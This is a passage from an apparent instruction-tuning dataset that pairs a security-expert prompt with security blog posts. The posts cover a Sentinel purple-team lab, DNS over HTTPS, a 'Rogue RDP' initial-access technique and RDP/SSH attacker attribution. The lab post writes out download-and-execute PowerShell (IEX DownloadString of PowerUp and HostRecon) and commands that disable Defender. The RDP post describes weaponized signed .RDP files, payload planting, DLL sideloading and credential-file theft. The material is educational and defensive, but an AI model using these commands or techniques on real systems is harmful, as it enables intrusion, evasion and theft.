VMs will need to be connected to Log Analytics for logs to start flowing The VMs deploy without a full connection and need an additional click and connect for full logging capability Once all of the virtual machines are connected to the Log Analytics workspace navigate back over to portal.azure.com Home and search for Sentinel Confirm that you have logs flowing Next you will need to gather the public IP address assignments for your virtual lab environment Based on feedback there is an RDP listener for each of the Windows VMs and an SSH listener for the Linux system Remember your credentials For the RDP connections use doazlab doadmin DOLabAdmin1 For SSH use doadmin DOLabAdmin1 Once you get RDP'd over to the DC run BadBlood to make some noise in AD The following commands will accomplish that ProgressPreference 'SilentlyContinue invoke-webrequest -URI ithub.com Relkci BadBlood archive refs heads master.zip -outfile badblood.zip Expand-Archive badblood.zip ProgressPreference 'Continue badblood BadBlood-master invoke-badblood.ps1 Do not run this in production You will have an absolute disaster on your hands Do not run this in production When completed you have a legacy AD environment that looks like some of the domains seen in the wild Let's make some PowerShell noise from the workstation to see how our log query capabilities can respond to invocation The next commands invoke PowerUp's AllChecks Set-ExecutionPolicy bypass -force IEX New-Object Net.WebClient .DownloadString 'aw.githubusercontent.com PowerShellEmpire PowerTools master PowerUp PowerUp.ps1 invoke-allchecks The next commands should quiet Microsoft Defender if you have issues You may need to tune the command if you made any changes in the ARM template earlier Set-MpPreference -ExclusionPath 'c users doadmin Set-MpPreference -ExclusionProcess powershell.exe cmd.exe Set-MpPreference -DisableIntrusionPreventionSystem true -DisableIOAVProtection true -DisableRealtimeMonitoring true -DisableScriptScanning true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend Last up for now let's run HostRecon Set-ExecutionPolicy bypass -Force Net.ServicePointManager SecurityProtocol Net.SecurityProtocolType Tls12 IEX New-Object Net.WebClient .DownloadString 'aw.githubusercontent.com dafthack HostRecon master HostRecon.ps1 Invoke-HostRecon Out-File recon.txt This should have created some noise in our LA dashboard which will allow us to formulate a plan for catching this activity in the future and even better to create an alarm condition Access the Sentinel dashboard and click on Logs Find the query field and enter the following KQL query union Event SecurityEvent where EventID in 4103 4104 4105 4688 where EventData contains iex or EventData contains invoke or EventData contains import or EventData contains bypass or EventData contains git project Computer RenderedDescription ParameterXml What is going on here What is KQL I thought KQL was Kibana query language The query we formulated looks for PowerShell-related log events see the 'where EventID clause We then string search against the 'EventData results from those specific IDs Finally we are only interested in a few columns you can remove the bottom line starting with project or add in front of it to comment that line and see the entire result set This would allow you to then formulate your own columns of interest using the 'project operator KQL is awesome and the DBAs among you will appreciate it and pick it up without concern If it walks like SQL and talks like SQL it's a lot like SQL And no Kusto Query Language is the language of Microsoft Sentinel And we have some interesting results below So we may want to save this query for later which is ridiculously easy See the Save button there Use it I save all the queries that return data of interest with a unique identifier As shown next I like the word sketchy It simplifies my future searches for the queries I have found useful You can also create Alerts with relative ease At this point I would be surprised if you were not excited about all the capabilities of the Azure cloud Let's tie this all together with some purple teaming methodology We had a goal to improve our internal operations and security posture We did that with a quick threat analysis using Sentinel and a couple of cloud VMs A side note here the Log Analytics agent can be installed on your on-premises servers too Risk Assessment Ongoing risks presented by PowerShell tools and an upcoming pentest The Plan Improve our PowerShell detection capabilities Attack Spin up a sandbox on Azure and run some sketchy PowerShell commands Hunt Defend Learn how to query and create alerts in Azure Sentinel Harden Adjust Future Create playbooks in Azure to respond to these alerts accordingly there is so much capability here maybe the next blog Report Demonstrate this to our CISO CTO see our reporting template ithub.com DefensiveOrigins AtomicPurpleTeam blob master Playbook PB0170.pdf Thanks for reading and please come join us for training webcasts pentests and all of your infosec needs ww.doazlab.com ithub.com DefensiveOrigins DO-LAB zure.microsoft.com en-us free ocs.microsoft.com en-us azure azure-resource-manager templates overview ocs.microsoft.com en-us azure data-explorer kusto query ithub.com DefensiveOrigins AtomicPurpleTeam"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>The DNS over HTTPS (DoH) Mess</title>\n<taxonomies>Author, General InfoSec Tips & Tricks, How-To, Informational, InfoSec 301, Joff Thyer, DNS Security, Joff Thyer</taxonomies>\n<creation_date>Tue, 15 Feb 2022 19:36:20 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Joff Thyer I woke up this Monday morning thinking that it's about time I spent time looking at my Domain Name Service DNS configuration in my network This thought also emanated from watching many discussions and participating in conversations with Paul Vixie at Wild West Hackin Fest in Reno Nevada 2021 To put this in context I have never been a person that assumes my local Internet Service Provider ISP DNS infrastructure is something I should rely upon No offense intended but I have always assumed that ISP infrastructure is held together by duct tape and bailing wire and I have always been a do it yourself sort of person Another way to say this is Hey guys just give me a fiber optic to Ethernet handoff route my static addresses to me pass my packets and the rest is on me I have had the amazing luck of finding an ISP that does exactly that and even went as far to say they would pass me a Border Gateway Protocol BGP table if I owned the address block Wow music to my ears It should come as no surprise that I have in the past managed massive networks myself with thousands of endpoints and that my home network is a tight ship You bet that I roll my own routing network address translation dynamic host configuration protocol DHCP and DNS services My network is rock-solid reliable if my upstream passes those packets of course And now for the uncomfortable discussion We live in the age of surveillance capitalism today and as a world Internet community we have literally let various companies get away with murder by mining the data exhaust that we continuously produce DNS is foundational to the Internet Its very design is highly distributed by definition It is 100 acceptable and encouraged to run your own DNS server in your own network and instruct DHCP to tell your network endpoints that your own DNS is the right and true place to translate domain names to IP addresses Unfortunately when it comes to home networks most people don't have the skills to do it themselves and rely on small office home office SOHO router vendor products many of which are cheaply engineered and highly vulnerable alas that topic is for another day When DNS meets surveillance capitalism bad things happen When any plaintext protocol is readable over the network and is mined for monetary reward your privacy is being violated and you are becoming the source of a vast amount of revenue There is a tiny saving grace if you run your own DNS server and that is the idea of caching Any DNS request that your local DNS server makes upon a client stub resolver's endpoint behalf will have a cache value known as a Time to Live TTL which your DNS server must honor Your DNS server remembers the answer to a request for a TTL number of seconds If you run your own DNS server and you DO NOT forward all requests to another DNS provider such as 8.8.8.8 your DNS server must ask the root name servers to aid in resolving a request The diagram below shows essentially how your local DNS server behaves when looking up www.whitehouse.gov for example The DNS server actions when looking up the www.whitehouse.gov DNS A record What's the problem As security professionals we love good encryption and let's face it DNS is not too pleasing because it's not encrypted What about DNSSEC Sorry DNSSEC cannot help us because its goal is to ensure the accuracy of the answer prevent spoofing which in turn helps address the cache poisoning issue but DNSSEC does not protect data in transit Well it turns out that the various browser vendors came up with one of the worst ideas ever That idea was to transmit DNS requests over HTTPS atatracker.ietf.org doc html rfc8484 Now you may be having an adverse reaction right about now I mean HTTPS is encrypted right Yes true it is encrypted but remember the surveillance capitalism comment above Think about this if your DNS traffic is sent to the browser vendor infrastructure your data is even more subject to surveillance In fact what has happened is a consolidation of significant control and power over your data Furthermore by doing this the extreme operational stability of a highly distributed architecture has suddenly become centralized in the hands of a few All the precepts of an open standard and free Internet are being subverted by the data-mining few We are additionally crossing the streams here from a protocol perspective HTTP Hypertext Transfer Protocol and DNS is NOT hypertext As a result we have a situation of vertical protocol stack single browser vendor lock in that has developed Is this what we want Is this the right solution I find myself extremely conflicted at this point in the article I mean is it not true that solid encryption is a good thing As security professionals we stand behind well-tested researched strong encryption but I personally cannot stand behind this whilst my privacy is being so thoroughly violated I am further conflicted in that I have no real assurance that my local ISP is not mining my encrypted data either Where do we turn from here There is another form of DNS encryption that has existed for a while known as DNS over Transport Layer Security DoT atatracker.ietf.org doc html rfc7858 Without diving into too deep a hole in short DoT at least tries to do the right thing by having an appropriate listening TCP service on TCP port 853 and using Transport Layer Security TLS as it's intended in an appropriate open standard protocol compliant fashion The challenge is just that DoT is indeed a new protocol and how can we do we instruct our client endpoint stub resolvers to properly use this protocol Sure we can turn back to our good old friend DHCP and have some sort of option then we must hope that all the operating system vendors do the right thing with the DNS stub resolver code implementing TLS support as needed Well not surprisingly the right solution does not always win in favor of the easy solution DoT would require a lot of change and people don't like change especially with something with an expectation level as ubiquitous as electricity The Simpsons is property of Disney But wait just a minute I am not being entirely fair on the topic of data surveillance Below is a sample list of DNS over HTTPS providers by domain name ironic huh Many of these purport value-added service through operational resiliency and filtering malware spyware domains advertisements cloudflare-dns.com and one.one.one.one Privacy policy statement here at log.cloudflare.com announcing-the-results-of-the-1-1-1-1-public-dns-resolver-privacy-examination dns.adguard.com b.adguard.com en dns overview dns.google and dns.google.com mines data as revenue source dns.nextdns.io Privacy Policy NextDNS dns.opendns.com and doh.umbrella.com Cisco business service ww.opendns.com website-terms-of-use dns.quad9.net ww.quad9.net service privacy Alright well having gone through this list it's a fair statement to say that most of the above have a reasonably strong statement about your privacy with one notable exception Thus my strongest objections come down to the violation of the protocol stack and individual browsers assuming the function of the client stub resolver process regardless of your local network configuration This is far from acceptable in large enterprise network operations who absolutely need to exercise security control over their network protocols As it happens many of the above DoH providers also support DoT So coming full circle back to my Monday morning goal of reexamining DNS in my network I took a moment to focus and think about my level of comfort It came down to this I absolutely 100 believe that anyone who can should run their own internal DNS server I like to continue being able to diagnose and see what DNS traffic is occurring inside my own network Running my own internal DNS server gives me the ability to configure and run my own domain filtering services which I have had in place for a number of years If you don't roll your own like me consider the Pi-Hole project ithub.com pi-hole I am not comfortable with the idea that ISPs are seeing surveillance capitalism as a revenue source and thus are likely examining my DNS traffic I am conflicted about destroying the distributed stable beauty of DNS in its original form but strong encryption is never a bad idea I settled on the idea that I will continue to run my own DNS server but will encrypt the traffic coming from that server to Quad9 using DoT Upon reading it feels as if Quad9 has the best interest and best intent of providers out there In conjunction with this I will actively block DoH to any of these public providers through an iptables rule updated with a dynamic IP set that I can change as needed Yes this means directly blocking TCP port 443 destined traffic to a set of specific IP addresses because someone thought it was a good idea to conflate protocols sigh I can maintain the domain list and update sporadically as needed Stubby Since my perimeter firewall is an Ubuntu-based device I needed to find software that can listen to the DNS request and then formulate it as a DNS over TLS DoT transaction to Quad9 I suspect there might be a number of choices available however I chose to use the DNS privacy daemon aptly named Stubby nsprivacy.org dns_privacy_daemon_-_stubby Installation was as simple as sudo apt install stubby Stubby acts as a local DNS privacy stub resolver sending DNS queries over an encrypted TLS connection using DoT Stubby is configured via a Yaml file named etc stubby stubby.yml and as you might expect Quad9 publishes a configuration for you Refer to upport.quad9.net hc en-us articles 4409217364237-DNS-over-TLS-Ubuntu-18-04-20-04-Stubby for more information Stubby Configuration File etc stubby stubby.yml If you desire to look up all the various settings you can find them here at etdnsapi.net documentation manpages stubby A few highlights for you as follows tls_authentication GETDNS_AUTHENTICATION_REQUIRED means that TLS must be used and there is no fallback tls_query_padding_blocksize 128 will use the EDNS0 option with padding to this number to hide the actual query size edns_client_subnet_private 1 true will prevent any client side subnet information from being sent to the authoritative server round_robin_upstreams 1 true will send the upstream queries to all the specified servers in a round-robin fashion idle_timeout 10000 specified in milliseconds keeps the TCP connections open for that period of time to lower connection overhead Can be overridden by the server end of the connection listen_addresses is your local end listening address For my own internal DNS server it makes sense to set this to 127.0.0.1 on port 8053 so I can then configure bind9 to use this Bind Configuration The next step is to change the bind configuration so that it forwards DNS requests to the local Stubby instance rather than using other DNS name servers to populate its cache You have two options here either forward all requests or forward requests unless the forwarder fails then fallback to normal DNS protocol operations In terms of bind configuration syntax this amounts to using the directive forward only versus forward first whereby the latter will fallback upon failure You are also required to configure the address you are forwarding to The screenshot below shows my configuration which is placed in the etc bind named.conf file within the options section Bind Forward First Configuration Final steps are to ensure that Stubby is running and also to ensure that Stubby is configured to start automatically in system services using the command 'systemctl enable stubby as root Stubby Status Shows Running and Enabled Then finally you can reload your bind name server using 'rndc reload and you will now be encrypting your Internet-bound DNS traffic to Quad9 Firewall Configuration In my specific case I use iptables to enforce my perimeter firewall rules and thus after I managed to get the DNS configuration updated I did need to change some things as follows Allow outbound TCP port 853 traffic to the Quad9 addresses Configure an IP set with common DoH providers and then block traffic to them Block any unauthorized DNS from going direct to servers without using internal DNS server One possible method I use to create the IP set for the DoH provider list is to list out the providers by domain name as above and then perform DNS lookups on each on a daily basis to ensure that if the providers are using anycast addresses the blocking list always has a current set of addresses Using a simple shell script and the ipset command provides an easy method to do this Shell Script to Create Maintain the IPSET named doh After you have this configuration in place you can easily create a crontab entry to continuously maintain the list on a periodic basis Making the assumption that your firewall is the perimeter device and that you are performing NAT and IP traffic forwarding you would need some sort of iptables rule to prevent forwarding any traffic to the DoH provider list In my configuration this rule looks as follows IP-Tables Rule to Block Forwarding of DoH Traffic You will also need to ensure that Stubby can communicate outbound from your firewall for its DNS over TLS traffic to be able to resolve domains against the Quad9 servers Outbound Firewall Rules Allowing DoT Traffic The final pi\u00e8ce de r\u00e9sistance is to ensure that any endpoints inside of your network cannot completely bypass your internal DNS server and send traffic to any DNS provider on the Internet It may not surprise you that many devices produced by Google just love to come preconfigured with 8.8.8.8 as their DNS resolver That shall not happen on my network If for example your internal network ranges are in the 10.0.0.0 8 class A somewhere a pair of rules similar to the below screenshot will happily accomplish this Rules to Block Unauthorized DNS Traffic And there we have it I have achieved temporary piece of mind by encrypting Internet-destined DNS traffic at least across to Quad9 while keeping my own ability to monitor normal DNS traffic inside my network I feel this is a fair balance of encryption privacy security and operational availability Happy trails in your own quest to surviving the mess that is DNS over HTTPS"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Rogue RDP  Revisiting Initial Access Methods</title>\n<taxonomies>Author, C2, General InfoSec Tips & Tricks, Mike Felch, Red Team, initial access, RDP, remote desktop</taxonomies>\n<creation_date>Mon, 28 Feb 2022 16:25:42 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Mike Felch The Hunt for Initial Access With the default disablement of VBA macros originating from the internet Microsoft may be pitching a curveball to threat actors and red teams that will inevitably make initial access a bit more difficult to achieve Over the last year I have invested some research time in pursuing the use of the Remote Desktop Protocol as an alternative initial access vector which this post will cover In efforts to regain traction I want to introduce a new technique I dubbed as Rogue RDP It's the ability to leverage a malicious RDP server an RDP relay and a weaponized .RDP connection file which forces unsuspecting victims into connecting and forwarding control over some parts of their machine With the right ruse an established connection will provide an attacker the necessary means to access files plant binaries for execution and under the right conditions execute remote code So to begin my journey I wanted to quickly identify the default extensions registered within Windows and their corresponding programs that would launch when executed To do this I generated a grid of extensions file types and their executable using PowerShell with the ftype and assoc built-in commands Additionally I also generated a file with each of the extensions so I could rapidly test default execution behavior by clicking on the files View Extensions and Executables in Grid C fm cmd c ftype foreach ft ex _ -split fm.add ft ex C cmd c assoc foreach e f _ -split pscustomobject Extension e FileType f Executable fm f out-gridview Generate Files from Extensions C cmd c assoc foreach e f _ -split hax hax e As seen in the above screenshot after randomly clicking files and investigating the launched program one extension continually jumped out at me RDP The beauty or danger with .RDP files is security providers email gateways and email clients all permit .RDP files to be sent and received by default Whether they are downloaded from a web browser shared via network file shares or simply sent through email they will arrive at their target unscathed At the time of this post all the default blocked attachment lists for Microsoft Outlook Office365 and Proofpoint allow .RDP files Microsoft Outlook upport.microsoft.com en-us office blocked-attachments-in-outlook-434752e1-02d3-4e90-9124-8b81e49a8519 Microsoft Online Services echcommunity.microsoft.com t5 exchange-team-blog changes-to-file-types-blocked-in-outlook-on-the-web ba-p 874451 Proofpoint elp.proofpoint.com Proofpoint_Essentials Email_Security Administrator_Topics 090_filtersandsenderlists Attachment_Types_Proofpoint_Essentials_Blocks_By_Default Weaponizing .RDP Files Next I needed to determine what I could leverage within an .RDP file for initial access Since the standard executable is Microsoft Terminal Services Client MSTSC this was a suitable place to start An .RDP file contains the configuration settings for Remote Desktop connections and since most corporate environments utilize RDP for shared computer resources among employees Microsoft added numerous features to enable file and printer sharing accessing clipboard contents audio and video capture devices smart cards and even plug-and-play devices Having used RDP heavily over the past 18 years my initial thought was to focus on the ability to force unsuspecting victims to map their local file system and clipboard to a rogue RDP server that I controlled In this way I could execute malicious programs on my server which would interact with the victim their MSTSC client file system This proved to be successful because Microsoft provides a nifty way for code running within a Terminal Server environment to interact with Terminal Server Clients using Device Redirection This capability is how accessing resources such as local drives and printers through Remote Desktop occurs Servers can enumerate the mapped file system of a connected client by using folder paths such as tsclient c for the C drive or even mounted Network File Shares using tsclient So let's say a client's computer has the following mounted paths Local Disk C USB Drive D Network File Share S They could be accessed by Local Disk tsclient c USB Drive tsclient d Network File Share tsclient s Bring-Your-Own-Servers BYOS To interact with a client we are going to need some internet-facing infrastructure It does not have to be sophisticated but the .RDP file will need to connect to a server that we control so that we can interact with the client Most Windows Servers that have RDP enabled on the internet will not last long before being inundated by threat actors trying to brute force access To curb this behavior I suggest modifying the RDP port to something higher and random Additionally temporarily disable access to RDP by firewalling your own IP address for testing We will tighten down more exposure later in the post but for now you just need A standard Windows Server Enable remote desktop Add a new user with RDP permissions With PowerShell you can modify the RDP listening port using Set-ItemProperty -Path 'HKLM SYSTEM CurrentControlSet Control Terminal Server WinStations RDP-Tcp -name PortNumber -Value 21390 New-NetFirewallRule -DisplayName 'RDPPORTLatest -Profile 'Public -Direction Inbound -Action Allow -Protocol TCP -LocalPort 21390 If we stop here there are several issues that become obvious to our unsuspecting targets First with initial access we always want to reduce the number of interactions we require our victims to make That is difficult because for their client to automatically connect to our server we have to pre-load credentials in the .RDP file we send them which is not possible nowadays because of Data Protection API DPAPI We could use a blank account password but that also requires weird interactions not to mention it exposes our server to anyone who can guess the username Because our RDP server identity is currently unverified and unknown the publisher looks super sketchy with the big yellow warning banner Finally what happens if the network of the target has blocked the outbound port 3389 While we have numerous hurdles to overcome we will attempt to solve all these problems When thinking through ways to resolve some of these difficulties I began considering the idea of writing some sort of RDP proxy After digging into the RDP protocols and quickly realizing that the complexity of the numerous layers would end up being too much effort for the time being I started looking for open-source projects that might have already implemented some of the communications and authentication channels My hope was to set up some sort of listener that could forward the traffic to my server then have the victim clients connect to my proxy This would eliminate having credentials floating around and give me the ability to auto-authenticate victims that connect Additionally it adds an extra layer of firewall protection so that only the proxy would be able to connect to the real RDP server It turns out there is an amazing open-source project called pyrdp that implemented most of the protocols already It acts as a MiTM man-in-the-middle proxy and not only will allow you to auto-authenticate but can also set up the listener on any port and even record live RDP connections It has a bunch of built-in features like automatically exfiltrating files that match signatures running commands or PowerShell scripts on the real server not the client machine monitoring the clipboard and even cloning certificates Reference ww.gosecure.net blog 2018 12 19 rdp-man-in-the-middle-smile-youre-on-camera I will spare you the implementation details but if you look at the above image you will notice numerous protocols authentication layers and device redirections that had to be implemented The protocols include 128-bit encryption via RC4 algorithm crazy bitmap bindings for the GUI virtual channels for interacting with the Operating System disk printer clipboard etc plus a range of other specifications for authentication encoding and communication What this does for us is provide the ability to pre-load our .RDP file configuration with any username our proxy hostname our proxy listening port to avoid potential firewalls and enable forwarding all drives printers and devices Once we have the .RDP file generated we can use LetsEncrypt to generate an SSL certificate for whatever domain we want to use on our proxy server then use OpenSSL to convert the certificate into a PFX file On a Windows machine you can import the PFX into the certificate store and sign the .RDP file using a built-in Windows utility called rdpsign.exe There is likely an easier way to do all of this By signing the .RDP file with your LetsEncrypt certificate we now have a safer-looking connection dialogue RDP Attacks With our pyrdp proxy running and pointed at our real Windows server all we need is some code that we execute once the sign-on session is established The client will be connecting to our proxy via MSTSC our proxy will automatically authenticate to our server and bi-directional communication will occur between our victim's client and our server This means the clients drives will be accessible by both our proxy and our server Binary Planting Data Exfil My favorite .RDP attack is enumerating mapped drives then identifying writable start-up locations so I can plant malicious payloads Because the code is being ran on my server EDR is mostly useless at preventing and responding unless it detects the file-write activity or a later execution Here are a few things to consider If you plant an LNK on the user's desktop the keyboard shortcut will not trigger execution until the client computer restarts Plant a binary in common auto-run locations Plant a DLL for sideloading i.e dbghelp.dll for Microsoft Teams Plant a .NET config binary for AppDomainManager injection You can also search for sensitive data files Depending on who I target I like to look for things like AWS Azure credentials and PowerShell history files Remote Code Execution If the client has Hyper-V enabled and a writable file share there is a chance you can immediately execute code although I have not found this to be a real-world red team experience A researcher named Abdelhamid Naceri introduced a method of writing a payload to C Program Files Hyper-V wfs.exe using an NTFS symbolic link then triggering the Microsoft Windows Fax and Scan execution using printer redirection via the client printer name due to control code dispatching Advanced RDP Tactics One cool technique is the ability to monitor and or plant clipboard contents When I was working through some testing I was executing the .RDP file from within a Windows virtual machine but capturing the clipboard contents of the host computer This was because I had my host clipboard mapped to my virtual machine and when the virtual machine connected to my rogue RDP server it was setting up a clipboard redirector Additionally because I had sharing enabled within my virtual machine one of my host folders was accessible from the RDP server as well Final Thoughts While I have automated most of the heavy lifting for deploying pyrdp and generating signing RDP files I am going to hold off on releasing the tool RogueRDP for the time being There only seem to be a handful of remediations currently worth mentioning For those interested in implementing some of the server-side code I would encourage you to check out the Cassia C library Block .RDP extensions for email Properly configure the GPO to prevent redirection Group Policy Settings Computer Configuration Administrative Templates Windows Components Remote Desktop Services Remote Desktop Session Host Also consider the methods in which an .RDP file can be delivered I commonly use email but common chat programs and even calendar injections work well too In some cases social networks also permit .RDP files Given the circumstances this is an excellent attack vector that unless remediated by Microsoft will prove to be fruitful for years to come I intentionally left some of the implementation details a little vague in this post until we get some traction from vendors to reduce the attack surface as well as corporations opportunity to restrict their Terminal Service configurations Additionally it leaves opportunity for those interested readers to decide how they want to implement their Windows Server server-side code and RDP relay without handing threat actors the keys An example of this is I tend to set up my relay to listen on a common port in case my target's network blocks the outbound port 3389 and then exfil interesting files using pyrdp instead of running enumeration code from my malicious Windows Server For more information on the Rogue RDP technique keep an eye out for my Wild West Hacking Fest presentation called Socially Acceptable Ways to Walk in the Front Door that Steve Borosh rvrsh3ll and I gave last year at Deadwood 2021 I look forward to other researchers investigating ways to execute remote code and even other ways of establishing RDP sessions cough I am looking at you RDP COM objects cough"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Geopolitical Cyber-Detection Lures for Attribution with Microsoft Sentinel</title>\n<taxonomies>Author, Blue Team, Blue Team Tools, General InfoSec Tips & Tricks, How-To, Hunt Teaming, Informational, InfoSec 101, Jordan Drysdale, ARM Templates, Attribution, Detection, Engineering, Geopolitics, hunting, Microsoft Sentinel</taxonomies>\n<creation_date>Tue, 17 May 2022 18:01:43 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Jordan Drysdale Summary There are tons of security event management SIEM solutions available these days but this blog will focus on Microsoft Sentinel Sentinel is easy to deploy logs are inexpensive to retain the platform is powerful and even massive data queries are insanely responsive Attribution is fun and scary too Have you ever wondered who is attacking your Remote Desktop Protocol RDP exposures Read on to learn this simple technique attackers hate Have you ever wondered who is trying to compromise your Linux Secure Shell SSH exposures Read on to find out why geopolitical cybersecurity has never been more interesting Attackers hate these tactics because they produce an instant readout of the threats your organization is facing right now Today In real time This write-up assumes the following You have server assets exposed to the public internet Your server assets have RDP and SSH exposed Your server assets are running the Log Analytics agent and are connected to a Log Analytics LA workspace Microsoft Sentinel is deployed and connected to the LA workspace Or you can take the super basic query techniques here and apply them to your own internet-exposed servers Since the only event IDs EIDs you need are 4624 and 4625 you do not need specialized audit policies in place either The basic SIEM pseudo-logic could be from auth_eids grab src_ip compare to geoIP.csv sort by count output col1 col2 col3 If you are planning to perform the following tasks with your own sandbox a quick-deployment ARM template is available at www.doazlab.com Please note that if you see errors while deploying the sandbox environment file an issue on our GitHub at ithub.com DefensiveOrigins DO-LAB Microsoft is constantly changing SKUs product availability and image names We do our best to keep up with them Pre-Requisites First things first then next things next make sure your VMs are connected to the Log Analytics LA workspace Once connected Sentinel should show logs are being ingested As mentioned next pre-reqs next Head back over to the LA workspace Home LA-workspace Use the north-south navigation pane to get to the 'Agents configuration Under Agents configuration navigate to 'Syslog and click to 'Add facility Add both the 1 authpriv and 2 auth facilities The changes will auto-apply to the Linux agent and syslogs will start flowing almost immediately The Important Bits Windows logs flowing Check Syslogs flowing Check Sentinel operational Check Time is an interesting ally in this attribution approach While reviewing this material it looks like it takes about an hour for each of these services to get picked up by the attacking bot networks Once identified the pandemonium really gets rolling in earnest and we start to see the results we want One of our goals with this approach is to create our own threat intel and by the end of this story you should be wondering why your threat intel feeds are not providing this kind of data The first query is owed to a brilliant student that Kent and I had in an early run of Applied Purple Teaming in 2022 so let's call this Pierce's RDP attribution query Go here ithub.com DefensiveOrigins SentinelKQL Copy the blog query 1 bits shown below skipping the README's description Paste that KQL query over to your Sentinel Logs New Query pane This query relies on simple parsing of the EID 4624 and 4625 events gathered from our exposed Windows systems If you did not deploy the ARM template from doazlab.com you may need to configure additional log collections on your VMs to ensure you have these events Run this query and behold the magnificence of identifying some of the internet's most dangerous and uncaring adversaries These folks script attacks smash down doors compromise systems take over accounts and rightfully escalate their compromises to their own version of Tier 2 Support Quick math this is approximately 25 000 guesses against two systems in 24 hours This is about 9 guesses per minute and we are not taking EID 4776 into account with this query If you honestly trust in your existing password policy be it 8 or 10 characters I have another story to tell you about compromise Black Hills InfoSec is a penetration testing firm We author reports for a living and hack as a hobby We are rather good at password attacks and we usually find a way to recover an account or two in our time-limited and scope-controlled testing These adversaries care not for your lockout policies nor your log analytics capacities nor the terms of your weeklong engagement They do not care about your IR processes and are not flying under radar screens but Most businesses have never seen anything like this type of log analysis and that means most of us are blind to this kind of attack We are up against legitimate and terrifyingly persistent adversaries We keep reading about compromise We keep reading about ransomware These results demonstrate so many things that make me shiver and keep me awake at night Every single authentication service that gets exposed to the public internet has about an hour of quiet time and peaceful life from inception After that our service exposures are under an endless stream of attacks Anyway let's get back to it We just parsed two of the most common Windows event IDs to produce an eye-opening result set 4624 An account was successfully logged on 4625 An account failed to log on Randy Franklin Smith's Ultimate Windows Security is my first stop every time for matters involving Windows events ww.ultimatewindowssecurity.com securitylog encyclopedia A quick investigation of our top attacker against the Cisco Talos Intelligence engine does not tell us much A poor rating for its email reputation likely because it was listed on one of the spam monitors These results are plus minus a stroke over a double bogey on a par 3 but are par for the state of threat intelligence feeds However know that with this basic level of analysis I would strongly advise that you should absolutely 100 without a doubt block all traffic from the networks in the next screenshot Ya I know I'm terrible at optimism NEXT What do the SSH logs look like Do you remember earlier when I mentioned one of our brilliant students Let's call this next one Pierce's SSH attribution query You can find this with a quick page search here ithub.com DefensiveOrigins SentinelKQL for SSH attribution Paste this query over to Sentinel Logs New Query pane This query looks at Syslog messages with Failed Password which matches against the SSH logs and look about like the following sshd Failed password for user from IP One remarkably interesting thing of note is that the difference has been consistent across my research over the last six months Attacks against exposed RDP services are primarily sourced from Russian IP blocks Attacks against exposed SSH services are primarily sourced from Southeast Asia These are the facts It is straightforward to build your own geo-heatmaps as well This step is beyond the scope of this blog but could look something like the following Imagine sorting this by successful logon which you can and seeing a country where you have zero workforce How would you react Check back in as we continue the deep dive through more of Sentinel's amazing capabilities"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Spoofing Microsoft 365 Like It's 1995</title>\n<taxonomies>Author, General InfoSec Tips & Tricks, How-To, Informational, Red Team, Steve Borosh, Microsoft 365, Spoofing, Steve Borosh</taxonomies>\n<creation_date>Tue, 24 May 2022 18:37:17 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Steve Borosh Why Phishing Those of us on the offensive side of security often find ourselves in the position to test our clients resilience to phishing attacks According to the Verizon 2021 Data Breach Investigations Report 1 phishing comprises 25 of all breaches Phishing remains one of the top ways adversaries enter networks Defense-in-Depth The phrase defense-in-depth has been used in the information security realm for a few years now meaning defenders layer their protections instead of leaning too hard on a single solution Email security especially requires the use of a defense-in-depth approach to phishing attacks Enterprises may monitor for newly created phishing domains filter or block spam in the cloud set SPF DKIM DMARC protection records and scan or block file attachments Along with user awareness training and offensive training engagements these protections provide multiple layers of defense that create hurdles adversaries must clear reducing their chances for success Phishing Engagements There are several types of phishing engagements often used for testing enterprises Some types are Click-rate tracking Who clicked How many times Credential harvesting Passwords Cookie theft Payload attached or linked Malicious Office Document MalDoc Executables Compressed files Many organizations have automated phishing training Often these programs require users to click a link in an email which tracks their bad behavior These training scenarios are great to introduce users to the potential hazards of phishing attacks however they may miss the mark when modeling more advanced adversaries Offensive Perspectives Phishing is the bane of many when trying to gain access to their target enterprise Phishing takes time and patience lots of patience If you're on offense with a limited timeframe and budget getting through all the defensive layers and staying there takes precision Even with all the patience and care taken to set up infrastructure craft a phishing email create a payload and get it through defenses all it takes is one user to report the phish and it's back to square one Setting up new infrastructure creating new pretext generating new payloads and sending from a new source all without being detected takes time and again patience What if we could cut out the infrastructure pieces skip 